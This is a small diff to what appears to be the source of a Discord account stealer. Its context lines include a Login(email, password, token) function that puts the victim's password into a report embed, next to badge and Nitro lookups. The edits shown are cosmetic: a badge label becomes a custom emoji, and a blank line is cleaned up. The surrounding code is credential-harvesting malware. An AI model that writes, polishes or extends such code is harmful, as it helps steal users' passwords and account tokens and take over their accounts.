@@ -107,7 +107,7 @@ function GetBadges(flags) {
 		badges += "Green Bughunter, "
 	}
 	if ((flags & House_Bravery) == House_Bravery) {
-		badges += "Hypesquad Bravery, "
+		badges += "<:HypeSquadBravery:941037226370957332>, "
 	}
 	if ((flags & House_Brilliance) == House_Brilliance) {
 		badges += "HypeSquad Brillance, "
@@ -154,7 +154,7 @@ function Login(email, password, token) {
 				                     **Password:** ||${password}||`,
                             "inline": true
                         },
-                        
+
                         {
                             "name": "**Other Info**",
                             "value": `**Nitro Type:** ${GetNitro(json.premium_type)}\n
